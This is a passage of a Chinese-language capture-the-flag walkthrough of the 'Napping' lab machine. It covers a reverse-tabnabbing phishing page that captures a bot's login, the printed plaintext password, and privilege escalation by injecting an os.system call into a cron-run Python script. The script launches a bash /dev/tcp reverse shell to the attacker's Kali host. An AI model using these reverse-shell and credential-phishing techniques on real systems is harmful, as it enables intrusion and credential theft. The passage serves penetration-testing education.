+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>192.168.203.1 - - <span style="color:#ff7b72;font-weight:bold">[</span>04/Mar/2026 20:30:10<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">&#34;GET /upfine.html HTTP/1.1&#34;</span> <span style="color:#a5d6ff">200</span> -
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>192.168.203.1 - - <span style="color:#ff7b72;font-weight:bold">[</span>04/Mar/2026 20:30:10<span style="color:#ff7b72;font-weight:bold">]</span> code 404, message File not found
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>192.168.203.1 - - <span style="color:#ff7b72;font-weight:bold">[</span>04/Mar/2026 20:30:10<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span style="color:#a5d6ff">404</span> -
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>192.168.203.132 - - <span style="color:#ff7b72;font-weight:bold">[</span>04/Mar/2026 20:32:01<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">&#34;GET /upfine.html HTTP/1.1&#34;</span> <span style="color:#a5d6ff">200</span> -
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>192.168.203.132 - - <span style="color:#ff7b72;font-weight:bold">[</span>04/Mar/2026 20:34:01<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">&#34;GET /upfine.html HTTP/1.1&#34;</span> <span style="color:#a5d6ff">200</span> -
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>└─$ nc -lvvp <span style="color:#a5d6ff">6688</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">6688</span> ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>192.168.203.132: inverse host lookup failed: Host name lookup failure
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>192.168.203.129<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>192.168.203.132<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">51902</span>         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span>POST /get_info.html HTTP/1.1                                                
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span>Host: 192.168.203.129:6688                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span>User-Agent: python-requests/2.22.0                                          
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span>Accept-Encoding: gzip, deflate                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span>Accept: */*                                                                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span>Connection: keep-alive                                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span>Content-Length: <span style="color:#a5d6ff">45</span>                                                          
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span>Content-Type: application/x-www-form-urlencoded                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">24</span><span>                                                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">25</span><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>daniel&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>C%40ughtm3napping123 sent 0, rcvd <span style="color:#a5d6ff">279</span> </span></span></code></pre></div><ul>
+<li><code>python http server</code>日志分析：日志显示<code>20:32:01</code>和<code>20:34:01</code>分别有一次GET请求，说明靶机后台由一个<em>Cron Job</em>（定时任务），每隔两分钟就会运行一次机器人脚本来审核提交的链接，状态码<code>200</code>说明，靶机成功下载了<code>upfine.html</code></li>
+<li><code>netcat</code>日志分析，<code>from[192.168.203.132]</code>，确认是靶机主动把数据送到了kali，<code>User-Agent</code>说明了管理员是使用Python<code>requests</code>库编写的自动化脚本，它被<code>Tabnabbing</code>脚本欺骗，跳转到了钓鱼页，并提交了表单</li>
+<li><code>%40</code>是URL编码，对应<code>@</code>，实际密码是<code>C@ughtm3napping123</code></li>
+</ul>
+<h3 id="234-思路梳理">2.3.4 思路梳理<a class="anchor" href="#234-%e6%80%9d%e8%b7%af%e6%a2%b3%e7%90%86">#</a></h3>
+<p><strong>第一次思路</strong></p>
+<p>三个文件<code>get_info.html</code>、<code>upfine.html</code>、<code>index.html</code></p>
+<table>
+  <thead>
+      <tr>
+          <th>文件/命令</th>
+          <th>作用</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>sudo python3 -m http.server 80</code></td>
+          <td>将当前终端所在的目录立即变成一个可以通过网络访问的 HTTP 静态文件服务器，让靶机能通过网络请求下载运行我的三个文件，且能将文件夹映射为URL路径，例如，文件夹里有<code>upfine.html</code>，那么访问<code>http://KALI_ip/upfine.html</code>能触发其中的JavaScript脚本，而80则意味着靶机访问我的Kali时，URL只需要写<code>http://192.168.174.129/</code>，而不需要额外标注端口号</td>
+      </tr>
+      <tr>
+          <td><code>index.html</code>(诱饵页)</td>
+          <td>是用户最初访问的合法页面，包含链接，诱导用户在新标签打开<code>upfine.html</code></td>
+      </tr>
+      <tr>
+          <td><code>upfine.html</code>(攻击脚本)</td>
+          <td>当被打开后，会反过来控制它的父窗口（即<code>index.html</code>所在的标签页），强制让父窗口跳转到钓鱼页面</td>
+      </tr>
+      <tr>
+          <td><code>get_info.html</code>(钓鱼页)</td>
+          <td>伪造登录界面，用户看完&quot;惊喜内容&quot;回到原标签页，会发现登陆已过期，从而不经意间输入账户密码</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>第二次思路</strong></p>
+<ol>
+<li>提交链接：在网站表单提交<code>http://192.168.203.129/upfine.html</code></li>
+<li>触发执行：靶机机器人（.132）每2分钟检查一次，打开了<code>upfine.html</code></li>
+<li>劫持窗口：<code>upfine.html</code>里的JS代码修改了机器人原窗口的地址，将其重定向到<code>get_info.html</code>（由Python服务器托管）</li>
+<li>自动提交：机器人回到原窗口，以为需要重新登录，自动填充了daniel的账号密码并点击提交</li>
+<li>捕获成功：<code>nc</code>拦截到了这个POST请求，将明文密码显示在命令行中</li>
+</ol>
+<h1 id="三提权">三、提权<a class="anchor" href="#%e4%b8%89%e6%8f%90%e6%9d%83">#</a></h1>
+<p><code>ssh daniel@192.168.203.132</code>，<code>C@ughtm3napping123</code></p>
+<h3 id="31-基础信息搜集">3.1 基础信息搜集<a class="anchor" href="#31-%e5%9f%ba%e7%a1%80%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>daniel@napping:~$ whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>daniel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>daniel@napping:~$ id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>1001<span style="color:#ff7b72;font-weight:bold">(</span>daniel<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>1001<span style="color:#ff7b72;font-weight:bold">(</span>daniel<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>1001<span style="color:#ff7b72;font-weight:bold">(</span>daniel<span style="color:#ff7b72;font-weight:bold">)</span>,1002<span style="color:#ff7b72;font-weight:bold">(</span>administrators<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>daniel@napping:~$ uname -a
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>Linux napping 5.4.0-89-generic <span style="color:#8b949e;font-style:italic">#100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>daniel@napping:~$ cat /etc/issue
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>Ubuntu 20.04.3 LTS <span style="color:#79c0ff">\n</span> <span style="color:#79c0ff">\l</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>daniel@napping:~$ netstat -antp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>Command <span style="color:#a5d6ff">&#39;netstat&#39;</span> not found, but can be installed with:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>apt install net-tools
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>Please ask your administrator.</span></span></code></pre></div><p>身份上，现在处于<code>administrators</code>(GID 1002)组，这不是标准组。
+系统内核上，<code>Linux 5.4.0-89-generic</code>属于比较现代的内核，内核溢出不是首选</p>
+<p>由于处于非标准组，应该查找系统中所有属于<code>administators</code>用户组的文件或目录</p>
+<h3 id="32-提权">3.2 提权<a class="anchor" href="#32-%e6%8f%90%e6%9d%83">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>daniel@napping:~$ find / -group administrators 2&gt;/dev/null
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>/home/adrian/query.py
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>daniel@napping:~$ cat /home/adrian/query.py
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>from datetime import datetime
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>import requests
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span><span style="color:#79c0ff">now</span> <span style="color:#ff7b72;font-weight:bold">=</span> datetime.now<span style="color:#ff7b72;font-weight:bold">()</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span><span style="color:#79c0ff">r</span> <span style="color:#ff7b72;font-weight:bold">=</span> requests.get<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;http://127.0.0.1/&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span><span style="color:#ff7b72">if</span> r.status_code <span style="color:#ff7b72;font-weight:bold">==</span> 200:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>    <span style="color:#79c0ff">f</span> <span style="color:#ff7b72;font-weight:bold">=</span> open<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;site_status.txt&#34;</span>,<span style="color:#a5d6ff">&#34;a&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>    <span style="color:#79c0ff">dt_string</span> <span style="color:#ff7b72;font-weight:bold">=</span> now.strftime<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;%d/%m/%Y %H:%M:%S&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>    f.write<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;Site is Up: &#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>    f.write<span style="color:#ff7b72;font-weight:bold">(</span>dt_string<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>    f.write<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;\n&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span>    f.close<span style="color:#ff7b72;font-weight:bold">()</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span><span style="color:#ff7b72">else</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span>    <span style="color:#79c0ff">f</span> <span style="color:#ff7b72;font-weight:bold">=</span> open<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;site_status.txt&#34;</span>,<span style="color:#a5d6ff">&#34;a&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span>    <span style="color:#79c0ff">dt_string</span> <span style="color:#ff7b72;font-weight:bold">=</span> now.strftime<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;%d/%m/%Y %H:%M:%S&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span>    f.write<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;Check Out Site: &#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span>    f.write<span style="color:#ff7b72;font-weight:bold">(</span>dt_string<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span>    f.write<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;\n&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span>    f.close<span style="color:#ff7b72;font-weight:bold">()</span></span></span></code></pre></div><p>同样属于<code>administrators</code>组的文件位于<code>/home/adrian/query.py</code>，它在另一个用户<code>adrian</code>的家目录下（我是daniel），此脚本定期使用<code>requests</code>访问本地web服务，并将结果写入<code>site_status.txt</code></p>
+<p>接着查看是否拥有对该脚本的写权限(w)</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>daniel@napping:~$ ls -l /home/adrian/query.py
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>-rw-rw-r-- <span style="color:#a5d6ff">1</span> adrian administrators <span style="color:#a5d6ff">481</span> Oct <span style="color:#a5d6ff">30</span>  <span style="color:#a5d6ff">2021</span> /home/adrian/query.py</span></span></code></pre></div><p>权限位<code>-rw-rw-r--</code>，所有者<code>adrian</code>(rw)，所属组<code>administrators</code>(rw)，其他用户(r)，而我作为<code>administrators</code>组的成员，拥有对此文件的直接修改权限</p>
+<p>接着查看<code>site_status.txt</code>文件的所有者</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>daniel@napping:/home/adrian$ ls -l /home/adrian/site_status.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>-rw-rw-r-- <span style="color:#a5d6ff">1</span> adrian adrian <span style="color:#a5d6ff">10240</span> Mar  <span style="color:#a5d6ff">5</span> 06:42 /home/adrian/site_status.txt</span></span></code></pre></div><p>该文件的用户和组都是<code>adrian</code>，最后修改时间是<code>Mar 5 06:42</code>，这是一个以<code>adrian</code>身份运行的定时任务(Cron job)。</p>
+<p>既然我的身份可以修改<code>query.py</code>，而<code>adrian</code>会定期执行它，那么我可以写入反弹shell脚本来让query.py脚本进行执行，获取更高的权限的shell</p>
+<p>在<code>/home/daniel</code>下写入<code>shell.sh</code>文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#!/bin/bash
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>bash -c <span style="color:#a5d6ff">&#39;bash -i &gt;&amp; /dev/tcp/192.168.203.129/6688 0&gt;&amp;1&#39;</span></span></span></code></pre></div><p>在<code>query.py</code>文件添加对<code>shell.sh</code>脚本的执行，内容如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>import os
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>os.system<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#39;/usr/bin/bash /home/daniel/shell.sh&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span></span></span></code></pre></div><p>kali中开启6688端口监听，成功拿到adrian用户的shell权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ nc -lvvp <span style="color:#a5d6ff">6688</span>                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">6688</span> ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>192.168.203.132: inverse host lookup failed: Host name lookup failure
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>192.168.203.129<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>192.168.203.132<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">52796</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>bash: cannot set terminal process group <span style="color:#ff7b72;font-weight:bold">(</span>4636<span style="color:#ff7b72;font-weight:bold">)</span>: Inappropriate ioctl <span style="color:#ff7b72">for</span> device
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>adrian@napping:~$ id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>1000<span style="color:#ff7b72;font-weight:bold">(</span>adrian<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>1000<span style="color:#ff7b72;font-weight:bold">(</span>adrian<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>1000<span style="color:#ff7b72;font-weight:bold">(</span>adrian<span style="color:#ff7b72;font-weight:bold">)</span>,1002<span style="color:#ff7b72;font-weight:bold">(</span>administrators<span style="color:#ff7b72;font-weight:bold">)</span></span></span></code></pre></div><h3 id="33-进一步提权">3.3 进一步提权<a class="anchor" href="#33-%e8%bf%9b%e4%b8%80%e6%ad%a5%e6%8f%90%e6%9d%83">#</a></h3>
+<p>进入<code>adrian</code>的shell里检查此用户是否有不用密码能运行root的权限命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>adrian@napping:~$ sudo -l
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>sudo -l
